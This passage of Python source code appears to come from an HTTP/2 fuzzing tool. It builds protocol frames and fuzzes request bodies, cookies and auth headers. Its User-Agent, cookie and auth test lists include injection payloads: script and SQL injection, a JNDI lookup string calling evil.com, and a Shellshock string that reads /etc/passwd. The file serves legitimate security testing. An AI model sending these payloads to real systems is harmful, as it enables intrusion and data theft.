                    (":method", "GET"),
                    (":path", "/"),
                    (":scheme", "https"),
                    (":authority", "example.com"),
                ]
            )

            headers_get = Request(
                "http2_headers_get",
                children=(
                    Size(name="length", block_name="headers_payload", length=3, endian=">"),
                    Byte(name="type", default_value=self.HEADERS),
                    Byte(name="flags", default_value=self.FLAG_END_STREAM | self.FLAG_END_HEADERS),
                    DWord(name="stream_id", default_value=1, endian=">"),
                    Block("headers_payload", children=(Static(default_value=headers_payload),)),
                ),
            )
            self.session.connect(headers_get)

            # POST request with DATA
            post_headers = self._encode_hpack_headers(
                [
                    (":method", "POST"),
                    (":path", "/api/data"),
                    (":scheme", "https"),
                    (":authority", "example.com"),
                    ("content-type", "application/json"),
                ]
            )
            post_request = Request(
                "http2_post_request",
                children=(
                    Static(default_value=struct.pack(">I", len(post_headers))[1:]),
                    Byte(name="type_h", default_value=self.HEADERS),
                    Byte(name="flags_h", default_value=self.FLAG_END_HEADERS),
                    DWord(name="stream_id_h", default_value=11, endian=">"),
                    Static(default_value=post_headers),
                    # DATA frame with payload
                    Size(name="data_length", block_name="post_data", length=3, endian=">"),
                    Byte(name="type_d", default_value=self.DATA),
                    Byte(name="flags_d", default_value=self.FLAG_END_STREAM),
                    DWord(name="stream_id_d", default_value=11, endian=">"),
                    Block(
                        "post_data",
                        children=(
                            SmartString(
                                name="json_body",
                                default_value='{"test": "data", "fuzzer": true}',
                                max_len=4096,
                            ),
                        ),
                    ),
                ),
            )
            self.session.connect(post_request)
            self.register_request(
                "HTTP2_Headers", "HEADERS frame variations (GET, POST, etc.)", "standard"
            )

        if self.is_request_enabled("HTTP2_Data"):
            # DATA frame variations
            data_frame = Request(
                "http2_data",
                children=(
                    Size(name="length", block_name="data_payload", length=3, endian=">"),
                    Byte(name="type", default_value=self.DATA),
                    Byte(name="flags", default_value=self.FLAG_END_STREAM),
                    DWord(name="stream_id", default_value=3, endian=">"),
                    Block(
                        "data_payload",
                        children=(
                            SmartString(
                                name="data",
                                default_value="Test data payload",
                                max_len=max_frame_size,
                            )
                        ),
                    ),
                ),
            )
            self.session.connect(data_frame)

            # Padded DATA frame
            padded_data = Request(
                "http2_padded_data",
                children=(
                    Static(default_value=b"\x00\x00\x20"),  # 32 bytes total
                    Byte(name="type", default_value=self.DATA),
                    Byte(name="flags", default_value=self.FLAG_PADDED | self.FLAG_END_STREAM),
                    DWord(name="stream_id", default_value=13, endian=">"),
                    Byte(name="pad_length", default_value=10),  # 10 bytes of padding
                    SmartString(name="payload", default_value="Padded data content", max_len=20),
                    Static(default_value=b"\x00" * 10),  # Padding
                ),
            )
            self.session.connect(padded_data)
            self.register_request("HTTP2_Data", "DATA frame variations with padding", "standard")

        if self.is_request_enabled("HTTP2_Goaway"):
            # GOAWAY frame
            goaway = Request(
                "http2_goaway",
                children=(
                    Static(default_value=b"\x00\x00\x08"),  # Length: 8 bytes minimum
                    Byte(name="type", default_value=self.GOAWAY),
                    Byte(name="flags", default_value=0),
                    DWord(name="stream_id", default_value=0, endian=">"),
                    DWord(name="last_stream_id", default_value=1, endian=">"),
                    DWord(name="error_code", default_value=self.NO_ERROR, endian=">"),
                    SmartString(name="debug_data", default_value="", max_len=1024),
                ),
            )
            self.session.connect(goaway)
            self.register_request("HTTP2_Goaway", "GOAWAY frame with debug data", "standard")

        if self.is_request_enabled("HTTP2_Priority") or enable_priority:
            # PRIORITY frame
            priority = Request(
                "http2_priority",
                children=(
                    Static(default_value=b"\x00\x00\x05"),  # Length: 5 bytes
                    Byte(name="type", default_value=self.PRIORITY),
                    Byte(name="flags", default_value=0),
                    DWord(name="stream_id", default_value=5, endian=">"),
                    DWord(
                        name="dependency", default_value=0x80000003, endian=">"
                    ),  # Exclusive, depends on stream 3
                    Byte(name="weight", default_value=16),
                ),
            )
            self.session.connect(priority)

            # Stream dependency chain attack
            dependency_chain = Request(
                "http2_dependency_chain",
                children=(
                    Static(default_value=b"\x00\x00\x05"),
                    Byte(name="type1", default_value=self.PRIORITY),
                    Byte(name="flags1", default_value=0),
                    DWord(name="stream1", default_value=15, endian=">"),
                    DWord(
                        name="dep1", default_value=0x80000000 | 13, endian=">"
                    ),  # Exclusive, depends on 13
                    Byte(name="weight1", default_value=255),
                    Static(default_value=b"\x00\x00\x05"),
                    Byte(name="type2", default_value=self.PRIORITY),
                    Byte(name="flags2", default_value=0),
                    DWord(name="stream2", default_value=17, endian=">"),
                    DWord(name="dep2", default_value=0x80000000 | 15, endian=">"),
                    Byte(name="weight2", default_value=128),
                ),
            )
            self.session.connect(dependency_chain)
            self.register_request("HTTP2_Priority", "PRIORITY frame dependency chains", "standard")

        if self.is_request_enabled("HTTP2_Push_Promise") or enable_push:
            # PUSH_PROMISE frame
            push_headers = self._encode_hpack_headers(
                [(":method", "GET"), (":path", "/pushed.css")]
            )
            push_promise = Request(
                "http2_push_promise",
                children=(
                    Size(name="length", block_name="push_payload", length=3, endian=">"),
                    Byte(name="type", default_value=self.PUSH_PROMISE),
                    Byte(name="flags", default_value=self.FLAG_END_HEADERS),
                    DWord(name="stream_id", default_value=1, endian=">"),
                    Block(
                        "push_payload",
                        children=(
                            DWord(name="promised_stream_id", default_value=2, endian=">"),
                            Static(default_value=push_headers),
                        ),
                    ),
                ),
            )
            self.session.connect(push_promise)
            self.register_request(
                "HTTP2_Push_Promise", "PUSH_PROMISE server push testing", "standard"
            )

        # Additional standard frames
        ping = Request(
            "http2_ping",
            children=(
                Static(default_value=b"\x00\x00\x08"),  # Length: 8 bytes
                Byte(name="type", default_value=self.PING),
                Byte(name="flags", default_value=0),  # No ACK
                DWord(name="stream_id", default_value=0, endian=">"),  # Connection-level
                QWord(name="ping_data", default_value=0x1234567890ABCDEF, endian=">"),
            ),
        )
        self.session.connect(ping)

        window_update = Request(
            "http2_window_update",
            children=(
                Static(default_value=b"\x00\x00\x04"),  # Length: 4 bytes
                Byte(name="type", default_value=self.WINDOW_UPDATE),
                Byte(name="flags", default_value=0),
                DWord(name="stream_id", default_value=0, endian=">"),  # Connection-level
                DWord(name="window_increment", default_value=65536, endian=">"),
            ),
        )
        self.session.connect(window_update)

        rst_stream = Request(
            "http2_rst_stream",
            children=(
                Static(default_value=b"\x00\x00\x04"),  # Length: 4 bytes
                Byte(name="type", default_value=self.RST_STREAM),
                Byte(name="flags", default_value=0),
                DWord(name="stream_id", default_value=1, endian=">"),
                Group(
                    "error_code",
                    values=[
                        struct.pack(">I", self.NO_ERROR),
                        struct.pack(">I", self.PROTOCOL_ERROR),
                        struct.pack(">I", self.FLOW_CONTROL_ERROR),
                        struct.pack(">I", self.STREAM_CLOSED),
                        struct.pack(">I", self.FRAME_SIZE_ERROR),
                        struct.pack(">I", self.REFUSED_STREAM),
                        struct.pack(">I", self.CANCEL),
                        struct.pack(">I", self.COMPRESSION_ERROR),
                    ],
                ),
            ),
        )
        self.session.connect(rst_stream)

        # SETTINGS variations
        settings_variations = Request(
            "http2_settings_variations",
            children=(
                Static(default_value=b"\x00\x00\x24"),  # Length: 36 bytes (6 settings x 6 bytes)
                Byte(name="type", default_value=self.SETTINGS),
                Byte(name="flags", default_value=0),
                DWord(name="stream_id", default_value=0, endian=">"),
                Word(name="setting1_id", default_value=self.SETTINGS_HEADER_TABLE_SIZE, endian=">"),
                DWord(name="setting1_val", default_value=4096, endian=">"),
                Word(name="setting2_id", default_value=self.SETTINGS_ENABLE_PUSH, endian=">"),
                DWord(name="setting2_val", default_value=1, endian=">"),
                Word(
                    name="setting3_id",
                    default_value=self.SETTINGS_MAX_CONCURRENT_STREAMS,
                    endian=">",
                ),
                DWord(name="setting3_val", default_value=100, endian=">"),
                Word(
                    name="setting4_id", default_value=self.SETTINGS_INITIAL_WINDOW_SIZE, endian=">"
                ),
                DWord(name="setting4_val", default_value=65535, endian=">"),
                Word(name="setting5_id", default_value=self.SETTINGS_MAX_FRAME_SIZE, endian=">"),
                DWord(name="setting5_val", default_value=16384, endian=">"),
                Word(
                    name="setting6_id", default_value=self.SETTINGS_MAX_HEADER_LIST_SIZE, endian=">"
                ),
                DWord(name="setting6_val", default_value=8192, endian=">"),
            ),
        )
        self.session.connect(settings_variations)

        settings_ack = Request(
            "http2_settings_ack",
            children=(
                Static(default_value=b"\x00\x00\x00"),  # Length: 0 bytes for ACK
                Byte(name="type", default_value=self.SETTINGS),
                Byte(name="flags", default_value=self.FLAG_ACK),
                DWord(name="stream_id", default_value=0, endian=">"),
            ),
        )
        self.session.connect(settings_ack)

        # ================================================================
        # PHASE 6: CONTENT PAYLOAD FUZZING
        # Application-layer testing: bodies, user-agents, cookies, auth
        # ================================================================
        if enable_content:
            self._define_content_payloads()

    def _define_content_payloads(self):
        """Define Phase 6 content payload fuzzing requests.

        These test application-layer behavior rather than frame-level protocol
        correctness. They use well-formed HPACK-encoded headers so servers
        process the content rather than rejecting frames with protocol errors.
        """
        target = self.target
        scheme = "https" if self.use_ssl else "http"

        # User-Agent patterns: desktop, mobile, bots, legacy, injection
        USERAGENT_PATTERNS = [
            # Desktop browsers
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/120.0.0.0",
            # Mobile browsers
            "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
            "Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
            # Bots and crawlers
            "Googlebot/2.1 (+http://www.google.com/bot.html)",
            "Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)",
            "curl/8.4.0",
            "python-requests/2.31.0",
            # Legacy/exotic
            "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)",
            # Injection test patterns
            "Mozilla/5.0 <script>alert(1)</script>",
            "Mozilla/5.0'; DROP TABLE users;--",
            "Mozilla/5.0 {{7*7}}",
            "Mozilla/5.0 ${jndi:ldap://evil.com/a}",
            "() { :; }; /bin/bash -c 'cat /etc/passwd'",
        ]

        # ----------------------------------------------------------
        # HTTP2_Content_POST_JSON - JSON body fuzzing
        # ----------------------------------------------------------
        if self.is_request_enabled("HTTP2_Content_POST_JSON"):
            json_headers = self._encode_hpack_headers(
                [
                    (":method", "POST"),
                    (":path", self._get_url_path("/api/data")),
                    (":scheme", scheme),
                    (":authority", target),
                    ("content-type", "application/json"),
                    ("accept", "application/json"),
                    ("user-agent", "OIDA-Fuzzer/1.0"),
                ]
            )
            json_post = Request(
                "HTTP2_Content_POST_JSON",
                children=(
                    # HEADERS frame (no END_STREAM - body follows)
                    Static(default_value=struct.pack(">I", len(json_headers))[1:]),
                    Byte(name="type_h", default_value=self.HEADERS),
                    Byte(name="flags_h", default_value=self.FLAG_END_HEADERS),
                    DWord(name="stream_id_h", default_value=101, endian=">"),
                    Static(default_value=json_headers),
                    # DATA frame with fuzzable JSON body
                    Size(name="data_length", block_name="json_body_block", length=3, endian=">"),
                    Byte(name="type_d", default_value=self.DATA),
                    Byte(name="flags_d", default_value=self.FLAG_END_STREAM),
                    DWord(name="stream_id_d", default_value=101, endian=">"),
                    Block(
                        "json_body_block",
                        children=(
                            SmartString(
                                name="json_body",
                                default_value='{"key":"value","array":[1,2,3],"nested":{"prop":"val"}}',
                                max_len=8192,
                                fuzzable=True,
                                radamsa_mutation_count=1000,
                            ),
                        ),
                    ),
                ),
            )
            self.session.connect(json_post)
            self.register_request(
                "HTTP2_Content_POST_JSON", "JSON body fuzzing over HTTP/2", "content"
            )

        # ----------------------------------------------------------
        # HTTP2_Content_POST_Multipart - Multipart file upload fuzzing
        # ----------------------------------------------------------
        if self.is_request_enabled("HTTP2_Content_POST_Multipart"):
            multipart_headers = self._encode_hpack_headers(
                [
                    (":method", "POST"),
                    (":path", self._get_url_path("/upload")),
                    (":scheme", scheme),
                    (":authority", target),
                    (
                        "content-type",
                        "multipart/form-data; boundary=---------------------------974767299852498929531610575",
                    ),
                    ("user-agent", "OIDA-Fuzzer/1.0"),
                ]
            )
            multipart_post = Request(
                "HTTP2_Content_POST_Multipart",
                children=(
                    Static(default_value=struct.pack(">I", len(multipart_headers))[1:]),
                    Byte(name="type_h", default_value=self.HEADERS),
                    Byte(name="flags_h", default_value=self.FLAG_END_HEADERS),
                    DWord(name="stream_id_h", default_value=103, endian=">"),
                    Static(default_value=multipart_headers),
                    # DATA frame with multipart body
                    Size(name="data_length", block_name="multipart_body", length=3, endian=">"),
                    Byte(name="type_d", default_value=self.DATA),
                    Byte(name="flags_d", default_value=self.FLAG_END_STREAM),
                    DWord(name="stream_id_d", default_value=103, endian=">"),
                    Block(
                        "multipart_body",
                        children=(
                            SmartString(
                                name="multipart_content",
                                default_value=(
                                    "-----------------------------974767299852498929531610575\r\n"
                                    'Content-Disposition: form-data; name="file"; filename="test.txt"\r\n'
                                    "Content-Type: text/plain\r\n\r\n"
                                    "Test content for file upload\r\n"
                                    "-----------------------------974767299852498929531610575--\r\n"
                                ),
                                max_len=16384,
                                fuzzable=True,
                            ),
                        ),
                    ),
                ),
            )
            self.session.connect(multipart_post)
            self.register_request(
                "HTTP2_Content_POST_Multipart",
                "Multipart file upload fuzzing over HTTP/2",
                "content",
            )

        # ----------------------------------------------------------
        # HTTP2_Content_POST_FormEncoded - URL-encoded form body
        # ----------------------------------------------------------
        if self.is_request_enabled("HTTP2_Content_POST_FormEncoded"):
            form_headers = self._encode_hpack_headers(
                [
                    (":method", "POST"),
                    (":path", self._get_url_path("/api/form")),
                    (":scheme", scheme),
                    (":authority", target),
                    ("content-type", "application/x-www-form-urlencoded"),
                    ("user-agent", "OIDA-Fuzzer/1.0"),
                ]
            )
            form_post = Request(
                "HTTP2_Content_POST_FormEncoded",
                children=(
                    Static(default_value=struct.pack(">I", len(form_headers))[1:]),
                    Byte(name="type_h", default_value=self.HEADERS),
                    Byte(name="flags_h", default_value=self.FLAG_END_HEADERS),
                    DWord(name="stream_id_h", default_value=105, endian=">"),
                    Static(default_value=form_headers),
                    # DATA frame with form body
                    Size(name="data_length", block_name="form_body", length=3, endian=">"),
                    Byte(name="type_d", default_value=self.DATA),
                    Byte(name="flags_d", default_value=self.FLAG_END_STREAM),
                    DWord(name="stream_id_d", default_value=105, endian=">"),
                    Block(
                        "form_body",
                        children=(
                            SmartString(
                                name="form_content",
                                default_value="username=admin&password=pass123&action=login&redirect=/dashboard",
                                max_len=8192,
                                fuzzable=True,
                                radamsa_mutation_count=1000,
                            ),
                        ),
                    ),
                ),
            )
            self.session.connect(form_post)
            self.register_request(
                "HTTP2_Content_POST_FormEncoded",
                "URL-encoded form body fuzzing over HTTP/2",
                "content",
            )

        # ----------------------------------------------------------
        # HTTP2_UserAgent_Fuzzing - User-Agent header fuzzing
        # ----------------------------------------------------------
        if self.is_request_enabled("HTTP2_UserAgent_Fuzzing"):
            # Build pre-encoded HEADERS frames for each user-agent pattern
            ua_frames = []
            for ua in USERAGENT_PATTERNS:
                ua_headers = self._encode_hpack_headers(
                    [
                        (":method", "GET"),
                        (":path", self._get_url_path("/")),
                        (":scheme", scheme),
                        (":authority", target),
                        ("user-agent", ua),
                        ("sec-ch-ua", '"Chromium";v="120", "Google Chrome";v="120"'),
                        ("sec-ch-ua-platform", '"Windows"'),
                        ("sec-ch-ua-mobile", "?0"),
                    ]
                )
                ua_frames.append(
                    self._create_frame(
                        self.HEADERS, self.FLAG_END_STREAM | self.FLAG_END_HEADERS, 107, ua_headers
                    )
                )

            ua_request = Request(
                "HTTP2_UserAgent_Fuzzing", children=(Group("ua_patterns", values=ua_frames),)
            )
            self.session.connect(ua_request)
            self.register_request(
                "HTTP2_UserAgent_Fuzzing",
                "User-Agent header fuzzing with browser patterns",
                "headers",
            )

        # ----------------------------------------------------------
        # HTTP2_Cookie_Fuzzing - Cookie header fuzzing
        # ----------------------------------------------------------
        if self.is_request_enabled("HTTP2_Cookie_Fuzzing"):
            # Get user-supplied cookie if any
            user_cookie = None
            if self.config:
                user_cookie = self.config.get_option("cookie", None)

            cookie_val = (
                user_cookie
                or "session=abc123def456; auth_token=eyJhbGciOiJIUzI1NiJ9; csrf_token=x8f2k9d3m5n7; prefs=lang=en&theme=dark"
            )

            cookie_headers = self._encode_hpack_headers(
                [
                    (":method", "GET"),
                    (":path", self._get_url_path("/dashboard")),
                    (":scheme", scheme),
                    (":authority", target),
                    ("cookie", cookie_val),
                    ("user-agent", "OIDA-Fuzzer/1.0"),
                ]
            )
            # Build as HEADERS + SmartString-based DATA for the cookie fuzz variation
            # Using Group of pre-built frames with different cookie patterns
            cookie_patterns = [
                # Normal cookies
                cookie_headers,
                # Long cookie value (overflow attempt)
                self._encode_hpack_headers(
                    [
                        (":method", "GET"),
                        (":path", "/"),
                        (":scheme", scheme),
                        (":authority", target),
                        ("cookie", "session=" + "A" * 8192),
                    ]
                ),
                # Many cookies
                self._encode_hpack_headers(
                    [
                        (":method", "GET"),
                        (":path", "/"),
                        (":scheme", scheme),
                        (":authority", target),
                        ("cookie", "; ".join([f"c{i}=v{i}" for i in range(100)])),
                    ]
                ),
                # Injection in cookie
                self._encode_hpack_headers(
                    [
                        (":method", "GET"),
                        (":path", "/"),
                        (":scheme", scheme),
                        (":authority", target),
                        ("cookie", "session=abc; admin=true; role=superuser"),
                    ]
                ),
                # Duplicate cookie headers (RFC 7540 Section 8.1.2.5)
                self._encode_hpack_headers(
                    [
                        (":method", "GET"),
                        (":path", "/"),
                        (":scheme", scheme),
                        (":authority", target),
                        ("cookie", "session=abc123"),
                        ("cookie", "tracking_id=uuid-1234-5678"),
                    ]
                ),
                # Special characters in cookie
                self._encode_hpack_headers(
                    [
                        (":method", "GET"),
                        (":path", "/"),
                        (":scheme", scheme),
                        (":authority", target),
                        ("cookie", "test=<script>alert(1)</script>; sql=' OR 1=1--"),
                    ]
                ),
            ]

            cookie_request = Request(
                "HTTP2_Cookie_Fuzzing",
                children=(
                    Group(
                        "cookie_patterns",
                        values=[
                            self._create_frame(
                                self.HEADERS, self.FLAG_END_STREAM | self.FLAG_END_HEADERS, 109, h
                            )
                            for h in cookie_patterns
                        ],
                    ),
                ),
            )
            self.session.connect(cookie_request)
            self.register_request(
                "HTTP2_Cookie_Fuzzing", "Cookie header fuzzing over HTTP/2", "headers"
            )

        # ----------------------------------------------------------
        # HTTP2_Auth_Fuzzing - Authentication header fuzzing
        # ----------------------------------------------------------
        if self.is_request_enabled("HTTP2_Auth_Fuzzing"):
            import base64

            # Get user-supplied bearer token if any
            user_bearer = None
            if self.config:
                user_bearer = self.config.get_option("auth_bearer", None)

            bearer_token = (
                user_bearer
                or "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.dozjgNryP4J3jVmNHl0w5N_XgL0n3I9PlFUP0THsR8U"
            )

            auth_patterns = [
                # Bearer token
                self._encode_hpack_headers(
                    [
                        (":method", "GET"),
                        (":path", self._get_url_path("/api/protected")),
                        (":scheme", scheme),
                        (":authority", target),
                        ("authorization", f"Bearer {bearer_token}"),
                    ]
                ),
                # Basic auth
                self._encode_hpack_headers(
                    [
                        (":method", "GET"),
                        (":path", self._get_url_path("/secure")),
                        (":scheme", scheme),
                        (":authority", target),
                        (
                            "authorization",
                            "Basic " + base64.b64encode(b"admin:password123").decode(),
                        ),
                    ]
                ),
                # Empty bearer
                self._encode_hpack_headers(
                    [
                        (":method", "GET"),
                        (":path", "/"),
                        (":scheme", scheme),
                        (":authority", target),
                        ("authorization", "Bearer "),
                    ]
                ),
                # Invalid scheme
                self._encode_hpack_headers(
                    [
                        (":method", "GET"),
                        (":path", "/"),
                        (":scheme", scheme),
                        (":authority", target),
                        ("authorization", "InvalidScheme token123"),
                    ]
                ),
                # Very long token
                self._encode_hpack_headers(
                    [
                        (":method", "GET"),
                        (":path", "/"),
                        (":scheme", scheme),
                        (":authority", target),
                        ("authorization", "Bearer " + "A" * 4096),
                    ]
                ),
                # Null byte injection in token
                self._encode_hpack_headers(
                    [
                        (":method", "GET"),
                        (":path", "/"),
                        (":scheme", scheme),
                        (":authority", target),
                        ("authorization", "Bearer token\x00admin"),
                    ]
                ),
                # Basic auth with long credentials
                self._encode_hpack_headers(
                    [
                        (":method", "GET"),
                        (":path", "/"),
                        (":scheme", scheme),
                        (":authority", target),
                        (
                            "authorization",
                            "Basic "
                            + base64.b64encode(("A" * 1000 + ":" + "B" * 1000).encode()).decode(),
                        ),
                    ]
                ),
                # Duplicate auth headers
                self._encode_hpack_headers(
                    [
                        (":method", "GET"),
                        (":path", "/"),
                        (":scheme", scheme),
                        (":authority", target),
                        ("authorization", "Bearer token1"),
                        ("authorization", "Bearer token2"),
                    ]
                ),
            ]

            auth_request = Request(
                "HTTP2_Auth_Fuzzing",
                children=(
                    Group(
                        "auth_patterns",
                        values=[
                            self._create_frame(
                                self.HEADERS, self.FLAG_END_STREAM | self.FLAG_END_HEADERS, 111, h
                            )
                            for h in auth_patterns
                        ],
                    ),
                ),
            )
            self.session.connect(auth_request)
            self.register_request(
                "HTTP2_Auth_Fuzzing", "Bearer token and auth header fuzzing", "auth"
            )

    def _get_monitors(self) -> List[BaseMonitor]:
        """Return list of monitors for HTTP/2 service"""
        monitors = []

        if self.config:
            from ..monitors import CustomSSLSocketMonitor

            ssl_monitor = CustomSSLSocketMonitor(self.config)
            monitors.append(ssl_monitor)

        return monitors

    def setup_custom_monitors(self) -> Optional[List[BaseMonitor]]:
        """Setup HTTP/2-specific monitors"""
        return self._get_monitors()
